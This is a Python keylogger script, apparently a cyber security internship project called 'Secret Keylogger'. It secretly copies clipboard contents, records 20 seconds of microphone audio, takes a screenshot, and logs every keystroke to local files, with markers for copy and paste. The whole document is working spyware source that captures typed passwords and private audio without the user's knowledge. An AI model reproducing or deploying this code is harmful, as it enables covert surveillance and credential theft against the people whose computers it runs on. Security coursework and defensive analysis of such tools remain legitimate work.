
# clipboard
import win32clipboard

# keystroke
from pynput.keyboard import Key, Listener


# microphone
from scipy.io.wavfile import write
import sounddevice as sd


from PIL import ImageGrab

keys_information = "key_log.txt"
system_info ="system_info.txt"
clipboard_info = "clip_board.txt"
audio_information = "audio.mp3"
screenshot_information = "screenshot.png"

microphone_time = 20

file_path = "E:\\cyber security internship\\project\\Secret Keylogger\\secretlogger"
extend = "\\"




#  to copy clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try :
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data : \n" + pasted_data)

        except:
            f.write("Copied clipboard is not a text!!")

copy_clipboard()


# to record microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    my_recording = sd.rec(int(seconds * fs), samplerate = fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, my_recording)

microphone()

# to get  screenshot
def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_information)

screenshot()


count = 0
keys = []

    # to record the pressed button
def on_press(key):
     global keys, count, currentTime

     print(key)
     keys.append(key)
     count += 1

     if count >= 1:
         count = 0
         write_file(keys)
         keys = []


# keys that are typed
def write_file(keys):

    with open(file_path + extend + keys_information, "a" ) as f:
        for key in keys:
           k = str(key).replace("'", "")
           if k.find("space") > 0:
              f.write(' ')
              f.close()

           elif k.find("enter") > 0:
               f.write('\n')
               f.close()

           elif k.find("up") > 0:
               f.write(' ')
               f.close()

           elif k.find("down") > 0:
               f.write(' ')
               f.close()

           elif k.find("left") > 0:
               f.write(' ')
               f.close()

           elif k.find("print_screen") > 0:
               f.write(' ')
               f.close()

           elif k.find("shift") > 0:
               f.write(' ')
               f.close()


           elif k.find("right") > 0:
               f.write(' ')
               f.close()

           elif k.find("ctrl_l") > 0:
               f.write('  \n ##################The user has Copied/Pasted some data ################ \n (If the value is x03, Then the user has copied some) '
                 '(If the value is x16, Then the user has pasted some data ) - ')
               f.close()

           elif k.find("esc") > 0:
               f.write(' ')
               f.close()

           elif k.find("delete") > 0:
               f.write(' ')
               f.close()

           elif k.find("caps") > 0:
               f.write(' ')
               f.close()

           elif k.find("alt") > 0:
               f.write(' ')
               f.close()


           elif k.find("key") == -1:
               f.write(k)
               f.close()

# when the pressed button is released
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listner:
        listner.join()
